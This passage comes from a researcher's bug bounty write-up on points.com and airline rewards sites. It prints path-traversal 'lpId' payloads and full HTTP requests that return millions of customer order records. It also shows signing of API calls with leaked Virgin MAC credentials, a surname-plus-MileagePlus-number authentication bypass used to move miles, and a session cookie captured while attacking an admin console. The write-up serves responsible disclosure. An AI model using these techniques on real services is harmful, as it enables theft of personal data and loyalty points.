<span>{</span><span>"error"</span><span>:</span><span>"Cannot process type 'text/html', expected 'application/json'"</span><span>}</span>
</code></pre>
<p>Our immediate guess was that the "lpId" parameter was being sent to the "lcp.points.com" API and, after we appended the question mark, it would break the HTTP response so that the backend could not interpret the HTTP response from the second server. We sought to confirm that by guessing the directories before and after the loyalty program UUID and seeing if the API would still function normally.</p>
<p>After testing for a while, we validated that each of the following payloads would allow us to normally add a recipient, allowing us to validate that the HTTP request was in-fact proxied to a second HTTP server. We did this by reading the LCP API documentation and observing that many of the HTTP requests with loyalty program UUIDs had a previous directory of "lps" and an appended directory of "mvs". By sending these additional directories and receiving the normal 200 OK HTTP response, it meant that we were able to traverse on the API and could potentially hit other API endpoints.</p>
<pre><code><span>"lpId"</span><span>:</span><span>"/0ccbb8ee-5129-44dd-9f66-a79eb853da73"</span>
<span>"lpId"</span><span>:</span><span>"/../lps/0ccbb8ee-5129-44dd-9f66-a79eb853da73"</span>
<span>"lpId"</span><span>:</span><span>"0ccbb8ee-5129-44dd-9f66-a79eb853da73/mvs/?"</span>
<span>"lpId"</span><span>:</span><span>"/../lps/0ccbb8ee-5129-44dd-9f66-a79eb853da73/mvs/?"</span>
</code></pre>
<p>Based on our understanding of the LCP API OAuth 2.0 MAC authentication scheme, if these secondary context HTTP requests were directed towards the "lcp.points.com" host, they would need to be signed using the specific customers "macKey" and "macID" parameters.</p>
<p>The very strange and interesting thing, however, was that this HTTP request was able to generate authorization tokens for any rewards program. When we tried to do that ourselves using our provisioned "lcp.points.com" credentials, we received authorization errors saying that we did not have permission to access the specific route.</p>
<p>The first thing that came to mind after seeing that the HTTP request could generate authorization tokens for any rewards program was that the points.com United website (which was built and hosted by points.com) was using a "god token" as an authorization bearer that had access to all rewards programs when sending the HTTP request to generate the points.com member authorization token.</p>
<p>If this were the case and we could traverse the API, then we would be able to rewrite entire POST request to any "lcp.points.com" endpoint that had global permissions. Our new interest became finding an endpoint to traverse to so that we could test whether or not the HTTP request was indeed being signed by a "god token."</p>

<p>To test our theory that the secondary context API may be using an authorization token that had global permissions, we sought to find other endpoints that we could traverse to and overwrite the entire API call where we could control the entire HTTP request. After taking a list of endpoints from the LCP API documentation, we ran them through an intruder configuration which tested for the specific endpoint with an appended "?" to cut off the remaining path.</p>
<p>As an example, to try to find the right directory for "/api/example" we'd send the following "lpId" payloads:</p>
<pre><code><span>"lpId"</span><span>:</span><span>"/api/example?"</span>
<span>"lpId"</span><span>:</span><span>"../api/example?"</span>
<span>"lpId"</span><span>:</span><span>"../../api/example?"</span>
</code></pre>
<p>Eventually, we had our first 200 OK HTTP response for the following payload:</p>
<p><strong>HTTP Request</strong></p>
<pre><code>POST /mileage-plus-transfer/mvs/recipient HTTP/<span>1.1</span>
Host<span>:</span> buymiles.mileageplus.com
<span>{</span><span>"mvPayload"</span><span>:</span><span>{</span><span>}</span><span>,</span><span>"lpId"</span><span>:</span><span>"../../v1/search/orders/?"</span><span>}</span>
</code></pre>
<p><strong>HTTP Response</strong></p>
<pre><code>HTTP/<span>2</span> <span>400</span> Bad Request
Content-type<span>:</span> application/json

<span>{</span><span>"error"</span><span>:</span><span>"Missing query parameter"</span><span>}</span>
</code></pre>
<p>After seeing the missing query parameter, we attempted to fuzz the GET parameters via the "lpId" parameter by appending them (e.g. /v1/search/orders?query=x) but weren't able to identify anything. This puzzled us for a bit, then we realized that the "/v1/search/orders" endpoint was a POST request that took a JSON body.</p>
<p>We saw the empty parameter "mvPayload" that we were sending and attempted to fuzz for parameters within the JSON body. Our intruder script ran, and then we saw one that was successful with a huge response size! It appeared the parameter "q" was the parameter the server was looking for.</p>
<p>By sending the following POST request, we were able to access the transaction data for all points.com loyalty programs including Delta, Emirates, Singapore Airlines, United, Etihad, Air Canada, Lufthansa, Southwest, Alaska, Hawaiian, and additionally many hotel reward points providers like Hilton, Marriott, and IHG:</p>
<p><strong>HTTP Request</strong></p>
<pre><code>POST /mileage-plus-transfer/mvs/recipient HTTP/<span>1.1</span>
Host<span>:</span> buymiles.mileageplus.com
User-Agent<span>:</span> Mozilla/<span>5.0</span> (Windows NT <span>10.0</span>; Win64; x64; rv<span>:</span><span>109.0</span>) Gecko/<span>20100101</span> Firefox/<span>110.0</span>
Content-Type<span>:</span> application/json
Content-Length<span>:</span> <span>59</span>
Connection<span>:</span> close

<span>{</span><span>"mvPayload"</span><span>:</span><span>{</span><span>"q"</span><span>:</span><span>"*"</span><span>}</span><span>,</span><span>"lpId"</span><span>:</span><span>"../../v1/search/orders/?"</span><span>}</span>
</code></pre>
<p><strong>HTTP Response</strong></p>
<pre><code>HTTP/<span>1.1</span> <span>200</span> OK
Date<span>:</span> Fri<span>,</span> <span>10</span> Mar <span>2023</span> <span>00</span><span>:</span><span>02</span><span>:</span><span>04</span> GMT
Content-Type<span>:</span> application/json

<span>{</span>
  <span>"orders"</span><span>:</span> <span>[</span>
    <span>{</span>
      <span>"payment"</span><span>:</span> <span>{</span>
        <span>"billingInfo"</span><span>:</span> <span>{</span>
        <span>"cardName"</span><span>:</span> <span>"Visa"</span><span>,</span>
        <span>"cardNumber"</span><span>:</span> <span>"XXXXXXXXXXXXXXXX"</span><span>,</span>
        <span>"cardType"</span><span>:</span> <span>"VISA"</span><span>,</span>
        <span>"city"</span><span>:</span> <span>"REDACTED"</span><span>,</span>
        <span>"country"</span><span>:</span> <span>"US"</span><span>,</span>
        <span>"expirationMonth"</span><span>:</span> <span>7</span><span>,</span>
        <span>"expirationYear"</span><span>:</span> <span>2023</span><span>,</span>
        <span>"firstName"</span><span>:</span> <span>"REDACTED"</span><span>,</span>
        <span>"lastName"</span><span>:</span> <span>"REDACTED"</span><span>,</span>
        <span>"phone"</span><span>:</span> <span>"REDACTED"</span><span>,</span>
        <span>"state"</span><span>:</span> <span>"TX"</span><span>,</span>
        <span>"street1"</span><span>:</span> <span>"REDACTED"</span><span>,</span>
        <span>"zip"</span><span>:</span> <span>"REDACTED"</span>
      <span>}</span><span>,</span>
      <span>"costs"</span><span>:</span> <span>{</span>
        <span>"baseCost"</span><span>:</span> <span>275</span><span>,</span>
        <span>"fees"</span><span>:</span> <span>[</span><span>]</span><span>,</span>
        <span>"taxes"</span><span>:</span> <span>[</span><span>]</span><span>,</span>
        <span>"totalCost"</span><span>:</span> <span>275</span>
      <span>}</span><span>,</span>
      <span>"currency"</span><span>:</span> <span>"USD"</span><span>,</span>
      <span>"type"</span><span>:</span> <span>"creditCard"</span>
    <span>}</span><span>,</span>
    <span>"user"</span><span>:</span> <span>{</span>
      <span>"balance"</span><span>:</span> <span>94316</span><span>,</span>
      <span>"email"</span><span>:</span> <span>"REDACTED"</span><span>,</span>
      <span>"firstName"</span><span>:</span> <span>"REDACTED"</span><span>,</span>
      <span>"lastName"</span><span>:</span> <span>"REDACTED"</span><span>,</span>
      <span>"memberId"</span><span>:</span> <span>"REDACTED"</span><span>,</span>
      <span>"memberValidation"</span><span>:</span> <span>"https://lcp.points.com/v1/lps/LOYALTY_PROGRAM_ID/mvs/MEMBER_TOKEN"</span><span>,</span>
      <span>"membershipLevel"</span><span>:</span> <span>"1"</span>
    <span>}</span><span>,</span>
    <span>"flightBookingDetails"</span><span>:</span> <span>{</span>
      <span>"destinationCode"</span><span>:</span> <span>"MDW"</span><span>,</span>
      <span>"destinationName"</span><span>:</span> <span>"Chicago (Midway), IL - MDW"</span><span>,</span>
      <span>"originCode"</span><span>:</span> <span>"SDF"</span><span>,</span>
      <span>"originName"</span><span>:</span> <span>"Louisville, KY - SDF"</span><span>,</span>
      <span>"roundTrip"</span><span>:</span> <span><span>true</span></span>
    <span>}</span>
  <span>}</span>
<span>]</span><span>,</span>
<span>"totalCount"</span><span>:</span> <span>"22745869"</span>
<span>}</span>
</code></pre>
<p>Once we saw the HTTP response, we immediately reported the issue. There were over 22 million records that we could query from various airlines and hotel rewards programs. It appeared that the "macKey" and "macID" signing the HTTP request was a sort of "god key" which had access to all rewards program data.</p>
<p>This vulnerability affected all <a href="https://www.points.com/partners/">nearly all points.com customers</a>.</p>
<h3 id="pointscom-catches-us">Points.com Catches Us</h3>
<p>Before we could even finish sending our report or see if other endpoints were accessible (e.g. adding points to a customer rewards account), the points.com team had detected our testing and had completely shut down United's production points.com website. Bummer! If we were malicious actors, we would've gotten caught trying to enumerate any significant number of records (the query returned 100 records per/request) via the exploit. The detection and response by the points.com team was seriously impressive.</p>
<p>After having tested the points.com infrastructure for a few days, we became increasingly interested in finding a vulnerability that would allow us to duplicate or generate unlimited miles. While the "buymiles.mileageplus.com" website was down, we began exploring the rest of the points.com infrastructure.</p>
<h2 id="3-leaked-credentials-for-virgin-rewards-program-allows-attacker-to-sign-api-requests-on-behalf-of-virgin-addremove-rewards-points-access-customer-accounts">(3) Leaked Credentials for Virgin Rewards Program allows Attacker to Sign API Requests on Behalf of Virgin, Add/Remove Rewards Points, Access Customer Accounts</h2>
<p>Amidst our testing on points.com assets, we discovered a website used by Virgin rewards customers to earn points when shopping on partner websites at "shopsaway.virginatlantic.com".</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fimage1.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fimage1.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fimage1.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fimage1.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fimage1.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fimage1.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fimage1.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fimage1.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fimage1.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>This website was interesting to us, because it was hosted by points.com and likely leveraged credentials by either points.com or Virgin to access information related to their program.</p>
<p>We ran discovery tools on the asset and found various PHP endpoints, including a "login1.php" endpoint which returned the following information:</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fimage2.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fimage2.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fimage2.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fimage2.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fimage2.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fimage2.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fimage2.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fimage2.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2Fimage2.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>Within the HTTP response of the "login1.php" endpoint were what appeared to be a testing rewards member's profile information alongside various keys.</p>
<p>The keys disclosed included the customer's authorization token, but much more interestingly, the "macID" and "macKey" values for what we assumed were for Virgin's points.com production tenant account!</p>
<p>Based on our understanding of the "lcp.points.com" API, we could use those secrets to access the API on behalf of the airline. We sought out a way to validate this. After scouring the internet for a while, we discovered the following code which could be used to sign HTTP requests to the "lcp.points.com" API using the leaked credentials:</p>
<pre><code><span>if</span> __name__ == <span>'__main__'</span>:
    <span>if</span> <span>'-u'</span> <span>not</span> <span>in</span> sys.argv:
        exit(<span>"Usage: %s -u &lt;macKeyIdentifier&gt;:&lt;macKey&gt; [curl options...] &lt;url&gt;"</span> % os.path.basename(__file__))
</code></pre>
<p>Using code from the <a href="https://github.com/xnt/Loyalty-Commerce-Platform/blob/0d9878bc29bae7c42e808b19865f6b91e1a02079/util/lcp_curl.py#L4">above Github repository built to help sign HTTP requests to "lcp.points.com"</a>, we could use the following syntax to send Virgin signed HTTP requests to the "lcp.points.com" API:</p>
<pre><code>python lcp_curl.py -u MAC_ID:MAC_SECRET <span>"https://lcp.points.com/v1/search/orders/?limit=1000"</span>
</code></pre>
<p>After running the above script to sign an HTTP request on behalf of the Virgin program to "/v1/search/orders" endpoint, we received the following data back:</p>
<pre><code><span>{</span>
  <span>"orders"</span><span>:</span> <span>[</span>
    <span>{</span>
      <span>"payment"</span><span>:</span> <span>{</span>
      <span>"billingInfo"</span><span>:</span> <span>{</span>
      <span>"cardName"</span><span>:</span> <span>"Visa"</span><span>,</span>
      <span>"cardNumber"</span><span>:</span> <span>"XXXXXXXXXXXXXXXX"</span><span>,</span>
      <span>"cardType"</span><span>:</span> <span>"VISA"</span><span>,</span>
      <span>"city"</span><span>:</span> <span>"REDACTED"</span><span>,</span>
      <span>"country"</span><span>:</span> <span>"US"</span><span>,</span>
      <span>"expirationMonth"</span><span>:</span> <span>4</span><span>,</span>
      <span>"expirationYear"</span><span>:</span> <span>2023</span><span>,</span>
      <span>"firstName"</span><span>:</span> <span>"REDACTED"</span><span>,</span>
      <span>"lastName"</span><span>:</span> <span>"REDACTED"</span><span>,</span>
      <span>"phone"</span><span>:</span> <span>"REDACTED"</span><span>,</span>
      <span>"state"</span><span>:</span> <span>"CA"</span><span>,</span>
      <span>"street1"</span><span>:</span> <span>"REDACTED"</span><span>,</span>
      <span>"zip"</span><span>:</span> <span>"REDACTED"</span>
    <span>}</span>
  ...
  <span>]</span><span>,</span>
  <span>"totalCount"</span><span>:</span> <span>"2032431"</span>
<span>}</span>
</code></pre>
<p>It worked!</p>
<p>This validated that the leaked credentials were valid and could be used to access the Virgin rewards program. An attacker could hit any of the "lcp.points.com" endpoints using these credentials, including administrative ones like adding/removing rewards points from customers, accessing customer accounts, and modifying tenant information related to the Virgin rewards program.</p>
<p>We reported the issue and the endpoint was removed within an hour.</p>

<p>On the United bug bounty program, there are a few domains that are explicitly out of scope including "mileageplus.com". Our guess why they're out of scope&nbsp; is that many of the "mileageplus.com" subdomains are actually powered by points.com.</p>
<p>One of the subdomains of this site is "widgets.unitedmileageplus.com" which acts as a sort of SSO service for United MileagePlus members to authenticate into apps like "buymiles.mileageplus.com" and "mpxadmin.unitedmileageplus.com".</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2FJ395vvYbOA_2pwL51HFCYb1mRcsjp_olCQ8qXJL61Df70Aa8QHl246yYM-KpHMWALhhW_ahek6mJSssMgSvWzk3e_q9b07I-tCUq2RA9eieFFvLjO7picW025X9TLYeAcjQpU6mDM0CeAoOt2xQvwDY&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2FJ395vvYbOA_2pwL51HFCYb1mRcsjp_olCQ8qXJL61Df70Aa8QHl246yYM-KpHMWALhhW_ahek6mJSssMgSvWzk3e_q9b07I-tCUq2RA9eieFFvLjO7picW025X9TLYeAcjQpU6mDM0CeAoOt2xQvwDY&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2FJ395vvYbOA_2pwL51HFCYb1mRcsjp_olCQ8qXJL61Df70Aa8QHl246yYM-KpHMWALhhW_ahek6mJSssMgSvWzk3e_q9b07I-tCUq2RA9eieFFvLjO7picW025X9TLYeAcjQpU6mDM0CeAoOt2xQvwDY&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2FJ395vvYbOA_2pwL51HFCYb1mRcsjp_olCQ8qXJL61Df70Aa8QHl246yYM-KpHMWALhhW_ahek6mJSssMgSvWzk3e_q9b07I-tCUq2RA9eieFFvLjO7picW025X9TLYeAcjQpU6mDM0CeAoOt2xQvwDY&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2FJ395vvYbOA_2pwL51HFCYb1mRcsjp_olCQ8qXJL61Df70Aa8QHl246yYM-KpHMWALhhW_ahek6mJSssMgSvWzk3e_q9b07I-tCUq2RA9eieFFvLjO7picW025X9TLYeAcjQpU6mDM0CeAoOt2xQvwDY&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2FJ395vvYbOA_2pwL51HFCYb1mRcsjp_olCQ8qXJL61Df70Aa8QHl246yYM-KpHMWALhhW_ahek6mJSssMgSvWzk3e_q9b07I-tCUq2RA9eieFFvLjO7picW025X9TLYeAcjQpU6mDM0CeAoOt2xQvwDY&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2FJ395vvYbOA_2pwL51HFCYb1mRcsjp_olCQ8qXJL61Df70Aa8QHl246yYM-KpHMWALhhW_ahek6mJSssMgSvWzk3e_q9b07I-tCUq2RA9eieFFvLjO7picW025X9TLYeAcjQpU6mDM0CeAoOt2xQvwDY&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2FJ395vvYbOA_2pwL51HFCYb1mRcsjp_olCQ8qXJL61Df70Aa8QHl246yYM-KpHMWALhhW_ahek6mJSssMgSvWzk3e_q9b07I-tCUq2RA9eieFFvLjO7picW025X9TLYeAcjQpU6mDM0CeAoOt2xQvwDY&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2FJ395vvYbOA_2pwL51HFCYb1mRcsjp_olCQ8qXJL61Df70Aa8QHl246yYM-KpHMWALhhW_ahek6mJSssMgSvWzk3e_q9b07I-tCUq2RA9eieFFvLjO7picW025X9TLYeAcjQpU6mDM0CeAoOt2xQvwDY&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>After enumerating the subdomain with <a href="https://github.com/lc/gau">gau</a>, we identified that there were various login pages that would authenticate you into related MileagePlus apps.</p>
<p>Each of these login pages expected different arguments: some would ask you for a United MileagePlus number and password, while others would ask you for a username, password, and an answer to your security questions. There was one very odd form, where it only asked you for your MileagePlus number and last name.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2F2_screenshot.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2F2_screenshot.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2F2_screenshot.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2F2_screenshot.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2F2_screenshot.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2F2_screenshot.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2F2_screenshot.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2F2_screenshot.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2F2_screenshot.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>We found that the token returned from each of the different authorization methods were identical in format to each other. We tested and found that it was possible to copy the token from the HTTP response where you authenticated using only your surname and MileagePlus number into the consumer endpoints from the more secure username, password, and security question endpoints and you would be authenticated into any of the applications!</p>
<p>This meant that there was an authorization bypass where we could skip logging into the account with the member credentials and instead only provide their name and MileagePlus number.</p>
<p>From an impact perspective, there were various apps that were accessible via this bypass including the "buymiles.mileageplus.com" which disclosed PII and allowed us to transfer miles to ourselves. We went ahead and used this exploit to transfer miles from one of our own accounts to another, demonstrating that it was indeed possible to transfer another user's miles using this authorization bypass.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2F1_screenshot.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2F1_screenshot.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2F1_screenshot.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2F1_screenshot.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2F1_screenshot.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2F1_screenshot.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2F1_screenshot.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2F1_screenshot.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=%2Fimages%2Fpoints-com%2F1_screenshot.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>The other much more interesting app that we could've (potentially) authenticated to was the "mpxadmin.unitedmileageplus.com" website. We were unable to confirm this because at the time of discovering the issue we didn't have the surname and a MileagePlus number of a United employee who may have had access to the app. If we did, we assume that it would've been possible and this level of access would allow us to manage the balances of customers, view transactions, and perform administrative actions for the MileagePlus rewards program.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2FB-JKV_3M4-qNFEKQcVRStwTDTeMjc7cAXIIddRu5J_m1Eu8k8x5PcQlISMEc_EuGs6p4N_nyfvO4rYA57p74i1xr-eG2uBiOLDrqaUjXdPQriQx6PeOm_2PgV5hdWPh8V1mPas_hcYNANxYhJvHCCjY&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2FB-JKV_3M4-qNFEKQcVRStwTDTeMjc7cAXIIddRu5J_m1Eu8k8x5PcQlISMEc_EuGs6p4N_nyfvO4rYA57p74i1xr-eG2uBiOLDrqaUjXdPQriQx6PeOm_2PgV5hdWPh8V1mPas_hcYNANxYhJvHCCjY&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2FB-JKV_3M4-qNFEKQcVRStwTDTeMjc7cAXIIddRu5J_m1Eu8k8x5PcQlISMEc_EuGs6p4N_nyfvO4rYA57p74i1xr-eG2uBiOLDrqaUjXdPQriQx6PeOm_2PgV5hdWPh8V1mPas_hcYNANxYhJvHCCjY&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2FB-JKV_3M4-qNFEKQcVRStwTDTeMjc7cAXIIddRu5J_m1Eu8k8x5PcQlISMEc_EuGs6p4N_nyfvO4rYA57p74i1xr-eG2uBiOLDrqaUjXdPQriQx6PeOm_2PgV5hdWPh8V1mPas_hcYNANxYhJvHCCjY&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2FB-JKV_3M4-qNFEKQcVRStwTDTeMjc7cAXIIddRu5J_m1Eu8k8x5PcQlISMEc_EuGs6p4N_nyfvO4rYA57p74i1xr-eG2uBiOLDrqaUjXdPQriQx6PeOm_2PgV5hdWPh8V1mPas_hcYNANxYhJvHCCjY&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2FB-JKV_3M4-qNFEKQcVRStwTDTeMjc7cAXIIddRu5J_m1Eu8k8x5PcQlISMEc_EuGs6p4N_nyfvO4rYA57p74i1xr-eG2uBiOLDrqaUjXdPQriQx6PeOm_2PgV5hdWPh8V1mPas_hcYNANxYhJvHCCjY&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2FB-JKV_3M4-qNFEKQcVRStwTDTeMjc7cAXIIddRu5J_m1Eu8k8x5PcQlISMEc_EuGs6p4N_nyfvO4rYA57p74i1xr-eG2uBiOLDrqaUjXdPQriQx6PeOm_2PgV5hdWPh8V1mPas_hcYNANxYhJvHCCjY&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2FB-JKV_3M4-qNFEKQcVRStwTDTeMjc7cAXIIddRu5J_m1Eu8k8x5PcQlISMEc_EuGs6p4N_nyfvO4rYA57p74i1xr-eG2uBiOLDrqaUjXdPQriQx6PeOm_2PgV5hdWPh8V1mPas_hcYNANxYhJvHCCjY&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Flh4.googleusercontent.com%2FB-JKV_3M4-qNFEKQcVRStwTDTeMjc7cAXIIddRu5J_m1Eu8k8x5PcQlISMEc_EuGs6p4N_nyfvO4rYA57p74i1xr-eG2uBiOLDrqaUjXdPQriQx6PeOm_2PgV5hdWPh8V1mPas_hcYNANxYhJvHCCjY&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>Since we couldn't confirm this, the hunt continued!</p>
<h3 id="looking-for-something-more-critical">Looking for something more critical…</h3>
<p>The holy grail for us would be the ability to generate unlimited miles. We'd never be able to actually exploit it (ethically), but just the idea of finding a way to travel the world with free first class flights, five star hotels, cruises, and meals kept us going...</p>
<figure><img alt="(what our fantasy world looked like, given that we could discover a vulnerability to generate unlimited rewards points)" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.insider.com%2F5b50aa5001180c3c008b46d2%3Fwidth%3D1300%26format%3Djpeg%26auto%3Dwebp&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.insider.com%2F5b50aa5001180c3c008b46d2%3Fwidth%3D1300%26format%3Djpeg%26auto%3Dwebp&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.insider.com%2F5b50aa5001180c3c008b46d2%3Fwidth%3D1300%26format%3Djpeg%26auto%3Dwebp&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.insider.com%2F5b50aa5001180c3c008b46d2%3Fwidth%3D1300%26format%3Djpeg%26auto%3Dwebp&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.insider.com%2F5b50aa5001180c3c008b46d2%3Fwidth%3D1300%26format%3Djpeg%26auto%3Dwebp&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.insider.com%2F5b50aa5001180c3c008b46d2%3Fwidth%3D1300%26format%3Djpeg%26auto%3Dwebp&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.insider.com%2F5b50aa5001180c3c008b46d2%3Fwidth%3D1300%26format%3Djpeg%26auto%3Dwebp&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.insider.com%2F5b50aa5001180c3c008b46d2%3Fwidth%3D1300%26format%3Djpeg%26auto%3Dwebp&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.insider.com%2F5b50aa5001180c3c008b46d2%3Fwidth%3D1300%26format%3Djpeg%26auto%3Dwebp&amp;w=3840&amp;q=75"><figcaption>(what our fantasy world looked like, given that we could discover a vulnerability to generate unlimited rewards points)</figcaption></figure>
<h3 id="switching-back-to-hunting-on-the-pointscom-global-administration-console">Switching Back to Hunting on the Points.com Global Administration Console</h3>
<p>After realizing that we couldn't go much further impact wise hunting on the airline websites, we switched our focus back to the original website we found that was used by points.com employees and rewards program owners to administratively manage their customers and rewards programs.</p>
<p>From what we saw in the JavaScript on the "console.points.com" website, there were tons of endpoints that were only accessible to points.com employees. We tested these endpoints for a few more hours, trying and failing to find any sort of authorization bypass or way around the permission checks. After a little while longer of frustrated attempts to escalate our privileges, we zoomed out and realized something obvious that we had been overlooking the entire time...</p>

<p>After we finally stopped testing the APIs and looking for permission vulnerabilities, we realized that we'd totally forgotten to look at the session cookies!</p>
<p>Based on the format of the cookie, we could tell that it was some weird encrypted blob because on the JWT-looking format of it. It took us a little more poking but we eventually realized that the core app session token was a signed Flask session cookie.</p>
<pre><code>session=.eJwNyTEOgzAMBdC7eO6QGNskXCZKrG8hgVqJdEPcvX3ru6n5vKJ9PwfetFHCiCqwtYopo4NLiPOo4jYMuhizpJLV8oicilQF_qOeF_a104taXJg7bdHPiecHfX8ccg.ZFCriA.99lOhq3pO8yBWM7XjBshaKjqPKU
</code></pre>
